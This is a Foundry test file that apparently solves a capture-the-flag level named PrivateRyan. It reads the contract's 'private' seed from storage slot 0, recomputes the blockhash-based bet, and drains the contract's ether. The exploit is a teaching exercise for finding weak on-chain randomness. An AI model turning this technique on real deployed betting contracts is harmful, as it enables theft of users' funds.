// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        // Read the 0 slot of the created contract - we need to know seed

        // FACTOR variable is a constant, so doesnt store in the storage
        uint256 slotnum = 0;
        bytes32 rawSlot = vm.load(address(instance), bytes32(slotnum));
        uint256 seed = uint256(rawSlot);

        uint256 num = calculateBet(100, seed);
        instance.spin{value: 0.01 ether}(num);
        checkSuccess();
    }

    function calculateBet(uint256 max, uint256 seed) internal returns (uint256 result) {
        uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
        uint256 factor = (FACTOR * 100) / max;
        uint256 blockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }


    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
